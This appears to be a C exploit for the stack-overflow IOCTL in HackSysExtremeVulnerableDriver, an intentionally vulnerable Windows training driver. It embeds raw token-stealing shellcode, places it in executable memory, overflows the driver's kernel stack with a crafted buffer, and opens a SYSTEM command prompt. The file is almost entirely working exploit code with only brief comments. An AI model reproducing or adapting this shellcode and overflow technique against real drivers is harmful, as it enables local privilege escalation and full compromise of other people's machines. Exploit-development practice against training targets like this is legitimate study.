#include <stdio.h>
#include <Windows.h>

// Set IO_CODE for the Stack Overflow Vulnerability
#define IO_CODE 0x222003

int main(int argc, char* argv[]) {

	// Declare 'shellcode' variable and store Tokenstealing shellcode
	char shellcode[] = "\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x49\x89\xc0\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x8b\x88\x80\x01\x00\x00\x48\x83\xf9\x04\x75\xe6\x4c\x8b\x88\x08\x02\x00\x00\x4d\x89\x88\x08\x02\x00\x00\x48\x83\xc4\x28\xc3";

	// Call VirtualAlloc() and move tokenstealing shellcode into the memory space with a RtlMoveMemory() call
	LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate shellcode.\n");
		exit(1);
	}

	RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));
	printf("[+] Shellcode has been allocated at: %p\n", Alloc);

	// Call CreateFileA() to interact with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	HANDLE vulnDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

	// Validate interaction with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	if (vulnDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error - Unable to get driver handle.\n");
		exit(1);
	}
	printf("[+] Successfully created file.\n");

	// Declare 'bytesRetn' variable for 'DeviceIoControl -> lpBytesReturned' parameter
	DWORD bytesRetn;

	// Set 'expl' variable to cause crash 
	char expl[2080];
	
	// Set 'offset' variable to control EIP
	const size_t offset = 2072;

	// Fill 'expl' variable with 'A' * 'offset'
	memset(expl, 'A', offset);
	// Move tokenstealing shellcode into 'expl' variable to overwrite EIP
	memcpy(&expl[offset], &Alloc, 0x8);

	// Send 'expl' variable to vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
	DeviceIoControl(vulnDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);

	CloseHandle(vulnDevice);

	// Obtain 'NT AUTHORITY\SYSTEM' command prompt
	system("cmd.exe");

	return 0;
}
